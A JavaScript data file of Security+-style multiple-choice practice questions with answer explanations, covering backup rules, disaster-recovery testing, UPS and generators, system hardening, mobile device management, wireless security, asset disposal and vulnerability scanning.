  { id:"D3-082", domain:3, obj:"3.4", diff:"medium", q:"The 3-2-1 backup rule recommends keeping three copies of data on two different media types with how many copies offsite?", options:["Two","Three","Zero","One"], answer:3, explain:"<strong>One</strong> copy offsite is what the 3-2-1 rule requires: three copies on two media types with one stored offsite to survive site-level disasters.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Zero</b>: keeping zero copies offsite leaves all data vulnerable to a single-site disaster, defeating the rule.</span><span class='qd'><b>Two</b>: the rule specifies one offsite copy, not two.</span><span class='qd'><b>Three</b>: storing all three copies offsite is not what the rule prescribes, which is one offsite.</span>" },
  { id:"D3-083", domain:3, obj:"3.4", diff:"hard", q:"A database must minimize data loss to near zero so that any committed transaction can be replayed after a crash. Which technique is MOST appropriate?", options:["Journaling/transaction logging","Cold site relocation","Differential backups once a day","Weekly full backups only"], answer:0, explain:"<strong>Journaling/transaction logging</strong> records changes as they occur so committed transactions can be replayed, minimizing data loss to a very low recovery point objective.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Weekly full backups only</b>: weekly backups could lose up to a week of transactions, far from near-zero loss.</span><span class='qd'><b>Cold site relocation</b>: a cold site addresses where to recover, not minimizing data loss of recent transactions.</span><span class='qd'><b>Differential backups once a day</b>: a daily differential could still lose up to a day of committed transactions.</span>" },
  { id:"D3-084", domain:3, obj:"3.4", diff:"medium", q:"What is a key characteristic of a virtual machine snapshot?", options:["It is a permanent encrypted archive","It captures the VM state at a point in time for quick rollback","It replaces the need for any backups","It load balances traffic"], answer:1, explain:"<strong>It captures the VM state at a point in time for quick rollback</strong> is the key characteristic of a snapshot, though it is not a substitute for independent backups.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It is a permanent encrypted archive</b>: snapshots are temporary point-in-time states, not permanent encrypted archives.</span><span class='qd'><b>It replaces the need for any backups</b>: snapshots depend on the original storage and do not replace proper backups stored separately.</span><span class='qd'><b>It load balances traffic</b>: load balancing is unrelated to capturing VM state.</span>" },
  { id:"D3-085", domain:3, obj:"3.4", diff:"easy", q:"Which device provides immediate, short-term battery power to allow systems to ride through brief outages or shut down gracefully?", options:["NAS","Generator","UPS","PDU"], answer:2, explain:"<strong>UPS</strong> provides immediate battery power for short durations, letting systems ride through brief outages or shut down gracefully.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Generator</b>: a generator supplies sustained power for long outages but takes seconds to start, not instantaneous bridging.</span><span class='qd'><b>PDU</b>: a power distribution unit distributes power to equipment but provides no battery backup.</span><span class='qd'><b>NAS</b>: network-attached storage stores data and has no power-bridging role.</span>" },
  { id:"D3-086", domain:3, obj:"3.4", diff:"medium", q:"In a data center power design, what is the typical relationship between a UPS and a generator?", options:["The generator provides instantaneous power and the UPS provides long-term power","Neither is needed if utility power exists","They serve identical roles and are redundant","The UPS bridges the brief gap until the generator starts and provides sustained power"], answer:3, explain:"<strong>The UPS bridges the brief gap until the generator starts and provides sustained power</strong> correctly describes their relationship in data center power design.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>They serve identical roles and are redundant</b>: a UPS gives instant short-term power while a generator gives long-term power, so their roles differ.</span><span class='qd'><b>The generator provides instantaneous power and the UPS provides long-term power</b>: this reverses reality, since the UPS is instantaneous and the generator is long-term.</span><span class='qd'><b>Neither is needed if utility power exists</b>: backup power is needed precisely because utility power can fail unexpectedly.</span>" },
  { id:"D3-087", domain:3, obj:"3.4", diff:"hard", q:"A company expects 40% annual user growth and wants to ensure infrastructure can handle future load without emergency purchases. Which practice MOST directly addresses this?", options:["Capacity planning","Key rotation","Data classification","Tabletop exercises"], answer:0, explain:"<strong>Capacity planning</strong> forecasts future demand so infrastructure scales ahead of growth, avoiding outages and rushed emergency purchases.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Tabletop exercises</b>: tabletop exercises validate incident response procedures, not future resource scaling.</span><span class='qd'><b>Key rotation</b>: rotating cryptographic keys is a security hygiene task unrelated to capacity growth.</span><span class='qd'><b>Data classification</b>: classifying data by sensitivity does not forecast or provision infrastructure capacity.</span>" },
  { id:"D3-088", domain:3, obj:"3.4", diff:"hard", q:"An organization wants to validate its disaster recovery plan by having staff discuss their roles and responses to a hypothetical scenario without touching production systems. Which test type is this?", options:["Parallel test","Tabletop exercise","Full interruption test","Failover test"], answer:1, explain:"<strong>Tabletop exercise</strong> is a discussion-based walkthrough of a scenario that validates roles and procedures without touching production systems.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Failover test</b>: a failover test actually shifts operations to the recovery environment, affecting live systems.</span><span class='qd'><b>Parallel test</b>: a parallel test runs recovery systems alongside production, going beyond pure discussion.</span><span class='qd'><b>Full interruption test</b>: a full interruption test halts production to fail over, the highest-risk option, not a discussion.</span>" },
  { id:"D3-089", domain:3, obj:"3.4", diff:"hard", q:"A team wants to confirm recovery systems can actually assume production workloads, accepting the risk of switching live traffic to the backup environment. Which test BEST meets this goal?", options:["Checklist review","Tabletop exercise","Failover test","Walkthrough"], answer:2, explain:"<strong>Failover test</strong> shifts operations to the recovery environment to verify it can sustain production, providing the strongest validation despite higher risk.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Tabletop exercise</b>: a tabletop is discussion-only and never actually switches workloads to confirm capability.</span><span class='qd'><b>Walkthrough</b>: a walkthrough reviews procedures step by step but does not move live traffic to the backup.</span><span class='qd'><b>Checklist review</b>: a checklist review only confirms documentation completeness, not real recovery capability.</span>" },
  { id:"D3-090", domain:3, obj:"3.4", diff:"medium", q:"In a parallel processing test of a recovery site, what happens?", options:["Only documentation is reviewed","Backups are deleted to save space","Production is shut down completely during the test","Recovery systems run alongside production without taking over live operations"], answer:3, explain:"<strong>Recovery systems run alongside production without taking over live operations</strong> describes a parallel test, verifying function without disrupting live operations.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Production is shut down completely during the test</b>: shutting down production describes a full interruption test, not a parallel test.</span><span class='qd'><b>Only documentation is reviewed</b>: reviewing only documents describes a checklist review, not running recovery systems.</span><span class='qd'><b>Backups are deleted to save space</b>: deleting backups is never part of any recovery test and would undermine recovery.</span>" }
);
SECPLUS.questions.push(
  { id:"D4-001", domain:4, obj:"4.1", diff:"easy", q:"What is the primary purpose of establishing a secure baseline for a system?", options:["To define a known-good standard configuration that all systems are measured against","To increase the clock speed of the processor","To encrypt all network traffic by default","To grant administrators unlimited privileges"], answer:0, explain:"<strong>A secure baseline</strong> is a documented, known-good standard configuration that systems are deployed to and audited against to detect configuration drift.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To increase the clock speed of the processor</b>: overclocking is a hardware performance tweak with no relationship to a security configuration standard.</span><span class='qd'><b>To encrypt all network traffic by default</b>: encryption may be one baseline setting, but a baseline is the overall reference configuration, not a single encryption mandate.</span><span class='qd'><b>To grant administrators unlimited privileges</b>: this violates least privilege and is the opposite of what a hardened baseline enforces.</span>" },
  { id:"D4-002", domain:4, obj:"4.1", diff:"easy", q:"Which practice reduces a system's attack surface by turning off features and services that are not needed?", options:["Default installation","Disabling unnecessary services and ports","Enabling all available protocols","Installing every optional package"], answer:1, explain:"<strong>Disabling unnecessary services and ports</strong> removes potential entry points, directly shrinking the attack surface.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Default installation</b>: out-of-the-box installs typically enable extra services and features, expanding rather than reducing the attack surface.</span><span class='qd'><b>Enabling all available protocols</b>: turning on every protocol adds more listening services and exploitable entry points.</span><span class='qd'><b>Installing every optional package</b>: adding optional software increases code, services, and vulnerabilities, growing the attack surface.</span>" },
  { id:"D4-003", domain:4, obj:"4.1", diff:"medium", q:"An administrator wants to ensure mobile devices can be remotely wiped if lost. Which solution provides this capability?", options:["A jump server","A host-based firewall","Mobile Device Management (MDM)","A vulnerability scanner"], answer:2, explain:"<strong>Mobile Device Management (MDM)</strong> enforces policy on enrolled devices and supports remote actions such as lock and wipe when a device is lost or stolen.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A host-based firewall</b>: it filters inbound and outbound traffic on a host but cannot remotely erase a device's data.</span><span class='qd'><b>A vulnerability scanner</b>: it identifies weaknesses and missing patches, not remote wipe or device management.</span><span class='qd'><b>A jump server</b>: it is a hardened intermediary for administering systems in a secure zone, unrelated to wiping mobile devices.</span>" },
  { id:"D4-004", domain:4, obj:"4.1", diff:"medium", q:"Which wireless authentication method uses a RADIUS server and individual user credentials rather than a single shared key?", options:["Open authentication","WPA2-Personal","WPA3-SAE only","WPA2/WPA3-Enterprise (802.1X)"], answer:3, explain:"<strong>WPA2/WPA3-Enterprise (802.1X)</strong> uses a RADIUS server so each user authenticates individually with their own credentials rather than a single shared key.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>WPA2-Personal</b>: Personal mode uses a single pre-shared key shared by all users, not per-user RADIUS authentication.</span><span class='qd'><b>WPA3-SAE only</b>: SAE is the Personal-mode handshake replacing the PSK exchange, still based on a shared password rather than a RADIUS server.</span><span class='qd'><b>Open authentication</b>: it performs no authentication at all and uses no credentials or RADIUS server.</span>" },
  { id:"D4-005", domain:4, obj:"4.1", diff:"hard", q:"A company allows employees to use personal phones for work. Security wants to separate corporate data from personal data so only corporate data can be wiped. Which approach is BEST?", options:["Containerization / application sandboxing on the device","Disabling the device camera","Requiring a six-digit PIN only","Full-device wipe policy for all devices"], answer:0, explain:"<strong>Containerization / application sandboxing on the device</strong> isolates corporate apps and data in a managed container, allowing a selective wipe of corporate data without touching personal content.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Full-device wipe policy for all devices</b>: this erases personal data too, which is unacceptable on an employee-owned phone.</span><span class='qd'><b>Disabling the device camera</b>: this restricts one peripheral but does nothing to separate or selectively wipe corporate data.</span><span class='qd'><b>Requiring a six-digit PIN only</b>: a PIN provides access control but does not partition corporate from personal data for a selective wipe.</span>" },
  { id:"D4-006", domain:4, obj:"4.1", diff:"medium", q:"What does WPA3 introduce to better protect Personal-mode wireless networks against offline password-guessing attacks?", options:["WEP fallback","Simultaneous Authentication of Equals (SAE)","Open System authentication","MAC address filtering"], answer:1, explain:"<strong>Simultaneous Authentication of Equals (SAE)</strong> replaces the WPA2 four-way handshake with a key exchange that resists offline dictionary attacks on captured handshakes.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>WEP fallback</b>: WEP is a deprecated, broken protocol, and reverting to it would weaken security, not strengthen it.</span><span class='qd'><b>Open System authentication</b>: it provides no password protection at all, so it cannot defend against password guessing.</span><span class='qd'><b>MAC address filtering</b>: it restricts which devices may connect but is easily spoofed and does not protect passwords from offline cracking.</span>" },
  { id:"D4-007", domain:4, obj:"4.1", diff:"easy", q:"Which document is the best source for vendor-recommended secure configuration settings for an operating system?", options:["A network diagram","A marketing brochure","A hardening guide or benchmark (such as CIS Benchmarks)","The end-user license agreement"], answer:2, explain:"<strong>A hardening guide or benchmark (such as CIS Benchmarks)</strong> provides consensus, vendor-aligned secure configuration recommendations for an operating system.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A marketing brochure</b>: it promotes product features for sales and contains no security configuration guidance.</span><span class='qd'><b>The end-user license agreement</b>: it defines legal usage terms, not technical hardening settings.</span><span class='qd'><b>A network diagram</b>: it depicts topology and connectivity, not host configuration standards.</span>" },
  { id:"D4-008", domain:4, obj:"4.1", diff:"medium", q:"To reduce risk on a server, an administrator removes the default 'admin' account and renames the local administrator account. This is an example of what?", options:["Network segmentation","Data classification","Patch management","Account hardening"], answer:3, explain:"<strong>Account hardening</strong> removes or renames default accounts and disables unused ones to eliminate well-known, easily targeted credentials.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Patch management</b>: that addresses applying software updates to fix vulnerabilities, not securing accounts.</span><span class='qd'><b>Network segmentation</b>: that divides the network into isolated zones, unrelated to default account names.</span><span class='qd'><b>Data classification</b>: that labels data by sensitivity, not a change to system accounts.</span>" },
  { id:"D4-009", domain:4, obj:"4.1", diff:"hard", q:"A site survey shows overlapping coverage and rogue access points. Which control MOST directly helps detect unauthorized access points on the corporate WLAN?", options:["A wireless intrusion prevention system (WIPS)","A DLP agent on endpoints","A TPM on each laptop","A web application firewall"], answer:0, explain:"<strong>A wireless intrusion prevention system (WIPS)</strong> continuously monitors the RF environment and can detect, classify, and contain rogue or unauthorized access points.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A DLP agent on endpoints</b>: it inspects data movement to prevent exfiltration, not wireless RF for rogue access points.</span><span class='qd'><b>A TPM on each laptop</b>: it is a hardware chip storing keys for disk encryption and secure boot, with no wireless monitoring role.</span><span class='qd'><b>A web application firewall</b>: it filters HTTP/HTTPS traffic to a web app, not radio frequencies for rogue access points.</span>" },
  { id:"D4-010", domain:4, obj:"4.1", diff:"medium", q:"Which technology stores cryptographic keys in dedicated hardware on a device to support full-disk encryption and secure boot?", options:["RAID controller","Trusted Platform Module (TPM)","DHCP server","Proxy server"], answer:1, explain:"<strong>A Trusted Platform Module (TPM)</strong> is a hardware chip that securely stores keys and platform measurements used for full-disk encryption and secure or measured boot.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>DHCP server</b>: it assigns IP addresses to clients and has no cryptographic key storage function.</span><span class='qd'><b>Proxy server</b>: it forwards and filters client requests, not a hardware key store for encryption.</span><span class='qd'><b>RAID controller</b>: it manages disk redundancy and performance, not cryptographic keys for full-disk encryption.</span>" },
  { id:"D4-011", domain:4, obj:"4.1", diff:"easy", q:"What is the main security benefit of enabling secure boot on an endpoint?", options:["It blocks all USB devices","It speeds up application launches","It verifies that only signed, trusted code loads during startup","It compresses the hard drive"], answer:2, explain:"<strong>It verifies that only signed, trusted code loads during startup</strong> by checking digital signatures of bootloaders and the OS kernel, blocking bootkits and tampered code.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It speeds up application launches</b>: secure boot validates startup integrity and does not improve application performance.</span><span class='qd'><b>It compresses the hard drive</b>: compression is a storage feature unrelated to verifying boot code signatures.</span><span class='qd'><b>It blocks all USB devices</b>: that is a separate device-control or port-restriction setting, not what secure boot does.</span>" },
  { id:"D4-012", domain:4, obj:"4.1", diff:"medium", q:"An organization wants to push a uniform hardened configuration to thousands of Windows endpoints automatically. Which tool is MOST appropriate?", options:["A spreadsheet of settings emailed to users","Manual configuration by each user","A printed checklist at each desk","Group Policy / configuration management tooling"], answer:3, explain:"<strong>Group Policy / configuration management tooling</strong> enforces consistent hardened baselines at scale and can detect or remediate configuration drift automatically.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A spreadsheet of settings emailed to users</b>: it relies on manual application, which is inconsistent and unenforced across thousands of endpoints.</span><span class='qd'><b>Manual configuration by each user</b>: hand configuration does not scale, is error-prone, and produces inconsistent results.</span><span class='qd'><b>A printed checklist at each desk</b>: a paper checklist cannot automatically push or enforce a configuration on any device.</span>" },
  { id:"D4-013", domain:4, obj:"4.1", diff:"hard", q:"A security team must harden IoT sensors that cannot run an agent and have hardcoded credentials. Which compensating control is the BEST first step?", options:["Place the devices on an isolated, segmented network with restricted access","Install antivirus on each sensor","Enable WPA3-Enterprise on the sensors","Ignore them since they are low-power"], answer:0, explain:"<strong>Placing the devices on an isolated, segmented network with restricted access</strong> is the best compensating control when devices cannot be hardened directly, limiting exposure and lateral movement.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Install antivirus on each sensor</b>: the scenario states the sensors cannot run an agent, so antivirus cannot be installed.</span><span class='qd'><b>Enable WPA3-Enterprise on the sensors</b>: this addresses wireless authentication, not the hardcoded credentials or the inability to harden the device.</span><span class='qd'><b>Ignore them since they are low-power</b>: low power does not reduce risk, and ignoring vulnerable devices leaves an open attack vector.</span>" },
  { id:"D4-014", domain:4, obj:"4.1", diff:"medium", q:"Which mobile deployment model gives the organization the MOST control because the company owns and fully manages the device?", options:["BYOD (Bring Your Own Device)","COPE (Corporate-Owned, Personally Enabled)","CYOD with personal ownership","Personal device with no enrollment"], answer:1, explain:"<strong>COPE (Corporate-Owned, Personally Enabled)</strong> gives the organization the most control because the company owns and fully manages the device while permitting limited personal use.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>BYOD (Bring Your Own Device)</b>: the employee owns the device, giving the organization the least control and limited management rights.</span><span class='qd'><b>CYOD with personal ownership</b>: personal ownership reduces organizational control compared with a company-owned model.</span><span class='qd'><b>Personal device with no enrollment</b>: an unenrolled personal device is outside management entirely, offering essentially no organizational control.</span>" },
  { id:"D4-015", domain:4, obj:"4.1", diff:"easy", q:"What is the purpose of applying the principle of least functionality when hardening a host?", options:["To disable all logging","To install as many features as possible","To provide only the functions required for the host's role","To allow every user to be an administrator"], answer:2, explain:"<strong>To provide only the functions required for the host's role</strong> is the goal of least functionality, running only the services, applications, and protocols a system needs.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To install as many features as possible</b>: maximizing features expands the attack surface, the opposite of least functionality.</span><span class='qd'><b>To allow every user to be an administrator</b>: that violates least privilege and is unrelated to limiting a host's functions.</span><span class='qd'><b>To disable all logging</b>: disabling logging removes visibility and security telemetry, which least functionality does not require.</span>" },
  { id:"D4-016", domain:4, obj:"4.1", diff:"hard", q:"A wireless engineer must choose channel widths and placement to minimize co-channel interference in a dense office. Which activity provides the data to make these decisions?", options:["A tabletop exercise","A data loss prevention scan","A penetration test","A wireless site survey and heat map"], answer:3, explain:"<strong>A wireless site survey and heat map</strong> produces signal strength, coverage, and interference data that informs access point placement, channel selection, and power settings.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A penetration test</b>: it attempts to exploit security weaknesses, not measure RF coverage or co-channel interference.</span><span class='qd'><b>A tabletop exercise</b>: it is a discussion-based incident-response drill, not a wireless RF measurement activity.</span><span class='qd'><b>A data loss prevention scan</b>: it inspects data movement for sensitive content, not wireless signal characteristics.</span>" },
  { id:"D4-017", domain:4, obj:"4.1", diff:"medium", q:"Which protocol should replace deprecated WEP and TKIP to provide strong wireless encryption?", options:["AES with CCMP/GCMP","RC4","DES","Open authentication"], answer:0, explain:"<strong>AES with CCMP/GCMP</strong> provides strong modern Wi-Fi encryption, used by WPA2 (CCMP) and WPA3 (GCMP), replacing deprecated WEP and TKIP.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>RC4</b>: the stream cipher underlying WEP and TKIP, deprecated due to well-known cryptographic weaknesses.</span><span class='qd'><b>DES</b>: an obsolete block cipher with a 56-bit key that is trivially brute-forced and not used for Wi-Fi encryption.</span><span class='qd'><b>Open authentication</b>: it provides no encryption at all, leaving traffic in cleartext.</span>" },
  { id:"D4-018", domain:4, obj:"4.1", diff:"easy", q:"Disabling a laptop's ability to boot from USB in firmware settings primarily protects against which threat?", options:["Phishing emails","Booting an unauthorized OS to bypass disk controls","Slow internet speeds","Expired TLS certificates"], answer:1, explain:"<strong>Booting an unauthorized OS to bypass disk controls</strong> is the threat addressed, since locking boot order and firmware stops an attacker with physical access from booting external media.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Phishing emails</b>: phishing targets users through messages and is unaffected by firmware boot settings.</span><span class='qd'><b>Slow internet speeds</b>: network throughput is unrelated to boot device configuration.</span><span class='qd'><b>Expired TLS certificates</b>: certificate validity is a transport-security concern, not a physical boot-media control.</span>" },
  { id:"D4-019", domain:4, obj:"4.1", diff:"medium", q:"A company uses geofencing in its MDM. What does this feature do?", options:["Filters spam email","Encrypts data at rest","Triggers actions or restrictions based on the device's geographic location","Scans for vulnerabilities"], answer:2, explain:"<strong>Triggering actions or restrictions based on the device's geographic location</strong> is what geofencing does, defining virtual boundaries that fire MDM actions when crossed.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Encrypts data at rest</b>: that is storage encryption, a separate control unrelated to location boundaries.</span><span class='qd'><b>Scans for vulnerabilities</b>: vulnerability scanning identifies weaknesses, not location-based policy triggers.</span><span class='qd'><b>Filters spam email</b>: spam filtering inspects message content, not device geographic location.</span>" },
  { id:"D4-020", domain:4, obj:"4.1", diff:"hard", q:"After hardening a fleet, an auditor finds several servers drifted from the baseline. Which process MOST effectively prevents recurring configuration drift?", options:["Disabling all change requests","Removing the baseline document","Annual manual reviews only","Automated configuration management with continuous compliance checks"], answer:3, explain:"<strong>Automated configuration management with continuous compliance checks</strong> continuously enforces and reports on the baseline, detecting and remediating drift far more reliably than periodic manual reviews.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Annual manual reviews only</b>: yearly checks leave long windows where drift goes undetected and uncorrected.</span><span class='qd'><b>Disabling all change requests</b>: blocking legitimate change management harms operations and does not prevent unauthorized drift.</span><span class='qd'><b>Removing the baseline document</b>: deleting the reference standard removes the very thing drift is measured against, making the problem worse.</span>" },
  { id:"D4-021", domain:4, obj:"4.2", diff:"easy", q:"What is the primary goal of an asset inventory in security operations?", options:["To track and account for all hardware, software, and data assets","To slow down the help desk","To replace the firewall","To delete old emails"], answer:0, explain:"<strong>To track and account for all hardware, software, and data assets</strong> is the goal of an asset inventory, since you cannot protect what you do not know you have.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To slow down the help desk</b>: an inventory supports operations and does not exist to impede the help desk.</span><span class='qd'><b>To replace the firewall</b>: an inventory is a record of assets, not a network security control that filters traffic.</span><span class='qd'><b>To delete old emails</b>: email retention or cleanup is unrelated to tracking organizational assets.</span>" },
  { id:"D4-022", domain:4, obj:"4.2", diff:"easy", q:"Assigning a specific employee as the owner responsible for a critical database is an example of what asset management practice?", options:["Data minimization","Ownership assignment","Network scanning","Penetration testing"], answer:1, explain:"<strong>Ownership assignment</strong> designates a responsible party to make decisions about classification, protection, and lifecycle of the asset.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data minimization</b>: that limits collection and retention of data, not assigning a responsible owner.</span><span class='qd'><b>Network scanning</b>: that discovers devices and services on the network, unrelated to assigning accountability.</span><span class='qd'><b>Penetration testing</b>: that actively probes for exploitable weaknesses, not an asset-ownership practice.</span>" },
  { id:"D4-023", domain:4, obj:"4.2", diff:"medium", q:"Which technology helps maintain an accurate hardware inventory by automatically detecting devices as they connect to the network?", options:["A screen saver policy","A spreadsheet emailed monthly","Automated asset discovery / network scanning tools","A printed asset tag only"], answer:2, explain:"<strong>Automated asset discovery / network scanning tools</strong> continuously identify connected devices, keeping the inventory current as assets join or leave the network.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A spreadsheet emailed monthly</b>: a static monthly file is quickly outdated and cannot automatically detect new devices.</span><span class='qd'><b>A printed asset tag only</b>: a physical tag labels hardware but cannot detect a device connecting to the network.</span><span class='qd'><b>A screen saver policy</b>: that locks idle screens for security and has no bearing on hardware inventory.</span>" },
  { id:"D4-024", domain:4, obj:"4.2", diff:"medium", q:"During secure disposal of decommissioned drives, which method ensures data cannot be recovered even with advanced forensic tools on traditional magnetic drives?", options:["Deleting files to the recycle bin","Renaming the partitions","Quick formatting the drive","Degaussing or physical destruction"], answer:3, explain:"<strong>Degaussing or physical destruction</strong> renders data on magnetic drives unrecoverable, since degaussing erases the magnetic field and destruction makes the media unusable.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Quick formatting the drive</b>: a quick format only clears the file table, leaving the underlying data recoverable.</span><span class='qd'><b>Deleting files to the recycle bin</b>: this merely marks files for removal and they remain fully recoverable.</span><span class='qd'><b>Renaming the partitions</b>: renaming changes labels only and does not remove or overwrite any data.</span>" },
  { id:"D4-025", domain:4, obj:"4.2", diff:"hard", q:"An organization sells used laptops with SSDs. A standard degausser is ineffective. Which sanitization method is MOST appropriate before resale?", options:["Cryptographic erase or a vendor secure-erase command","Throwing them in the trash","Overwriting once with a quick format","Degaussing the SSD"], answer:0, explain:"<strong>Cryptographic erase or a vendor secure-erase command</strong> reliably sanitizes SSDs by destroying the encryption key or invoking the drive's built-in secure erase.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Degaussing the SSD</b>: degaussing affects magnetic media and does nothing to flash memory cells in an SSD.</span><span class='qd'><b>Throwing them in the trash</b>: discarding intact drives leaves recoverable data exposed and is not sanitization.</span><span class='qd'><b>Overwriting once with a quick format</b>: SSD wear leveling can leave data in unaddressed cells, so a single quick format does not guarantee erasure.</span>" },
  { id:"D4-026", domain:4, obj:"4.2", diff:"medium", q:"What does a certificate of destruction provide during asset disposal?", options:["A warranty extension","Documented proof that media was destroyed according to policy","A discount on new hardware","Encryption keys for the drive"], answer:1, explain:"<strong>Documented proof that media was destroyed according to policy</strong> is what a certificate of destruction provides, supporting compliance and chain-of-custody requirements.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A warranty extension</b>: a warranty covers product repair or replacement, not evidence of media destruction.</span><span class='qd'><b>A discount on new hardware</b>: a purchase incentive is unrelated to documenting destruction of old media.</span><span class='qd'><b>Encryption keys for the drive</b>: a destruction certificate records that media was destroyed, it does not supply keys.</span>" },
  { id:"D4-027", domain:4, obj:"4.2", diff:"easy", q:"In asset management, what is 'data sanitization'?", options:["Encrypting files in transit","Backing up data to the cloud","Removing data from media so it cannot be reconstructed","Compressing files to save space"], answer:2, explain:"<strong>Removing data from media so it cannot be reconstructed</strong> is data sanitization, achieved through methods such as overwriting, cryptographic erase, or physical destruction.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Backing up data to the cloud</b>: backup copies and preserves data, the opposite of rendering it irretrievable.</span><span class='qd'><b>Compressing files to save space</b>: compression reduces file size while keeping data fully readable.</span><span class='qd'><b>Encrypting files in transit</b>: that protects data moving over a network, not removing data from media at end of life.</span>" },
  { id:"D4-028", domain:4, obj:"4.2", diff:"hard", q:"A company discovers many unmanaged virtual machines spun up by developers and never tracked. Which asset management concept does this gap represent, and what should be implemented FIRST?", options:["Data classification; encrypt all VMs","Patch tuesday; reboot all servers","Penetration testing; attack the VMs","Shadow IT; implement an enrollment/provisioning and inventory process"], answer:3, explain:"<strong>Shadow IT; implement an enrollment/provisioning and inventory process</strong> is correct because untracked, self-provisioned resources are shadow IT, and standardized provisioning tied to the inventory brings them under management first.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data classification; encrypt all VMs</b>: classification and encryption do not address the core problem of unknown, untracked assets.</span><span class='qd'><b>Patch tuesday; reboot all servers</b>: rebooting patched servers does not discover or inventory the untracked VMs.</span><span class='qd'><b>Penetration testing; attack the VMs</b>: exploiting the VMs does not bring them into managed inventory or governance.</span>" },
  { id:"D4-029", domain:4, obj:"4.2", diff:"medium", q:"Why is classifying assets by criticality important for security operations?", options:["It prioritizes protection, monitoring, and recovery resources","It eliminates the need for backups","It disables auditing","It makes invoices larger"], answer:0, explain:"<strong>It prioritizes protection, monitoring, and recovery resources</strong> by ensuring the most critical assets receive proportionally stronger controls and recovery priority.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It makes invoices larger</b>: classification by criticality has nothing to do with billing amounts.</span><span class='qd'><b>It eliminates the need for backups</b>: criticality classification informs backup priority, it does not remove the need to back up data.</span><span class='qd'><b>It disables auditing</b>: classification supports stronger oversight, not the disabling of audit functions.</span>" },
  { id:"D4-030", domain:4, obj:"4.2", diff:"medium", q:"Which stage of the asset lifecycle includes secure decommissioning and disposal?", options:["Acquisition/procurement","End-of-life retirement","Initial deployment","Daily operation"], answer:1, explain:"<strong>End-of-life retirement</strong> handles decommissioning, sanitization, and disposal so retired assets do not leak data or remain attack surface.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Acquisition/procurement</b>: that stage covers selecting and purchasing assets, the start of the lifecycle, not disposal.</span><span class='qd'><b>Initial deployment</b>: that stage configures and brings an asset into service, not retiring it.</span><span class='qd'><b>Daily operation</b>: that is ongoing use and maintenance, not the secure decommissioning phase.</span>" },
  { id:"D4-031", domain:4, obj:"4.3", diff:"easy", q:"What does a vulnerability scanner do?", options:["Generates user passwords","Encrypts all hard drives","Identifies known weaknesses and missing patches on systems","Routes packets between subnets"], answer:2, explain:"<strong>Identifies known weaknesses and missing patches on systems</strong> is what a vulnerability scanner does, comparing system attributes against a database of known vulnerabilities and misconfigurations.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Encrypts all hard drives</b>: disk encryption is a data-protection control, not vulnerability identification.</span><span class='qd'><b>Routes packets between subnets</b>: that is a router's function, unrelated to scanning for weaknesses.</span><span class='qd'><b>Generates user passwords</b>: password generation is a credential function, not vulnerability assessment.</span>" },
  { id:"D4-032", domain:4, obj:"4.3", diff:"easy", q:"What is a CVE?", options:["A cloud backup service","A wireless encryption protocol","A type of firewall rule","A standardized identifier for a publicly known vulnerability"], answer:3, explain:"<strong>A standardized identifier for a publicly known vulnerability</strong> is what a CVE is, giving each disclosed vulnerability a unique reference so tools and teams can cite it consistently.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A type of firewall rule</b>: firewall rules control traffic, they are not vulnerability identifiers.</span><span class='qd'><b>A cloud backup service</b>: that stores data copies, unrelated to naming vulnerabilities.</span><span class='qd'><b>A wireless encryption protocol</b>: encryption protocols protect Wi-Fi traffic, not a vulnerability catalog identifier.</span>" },
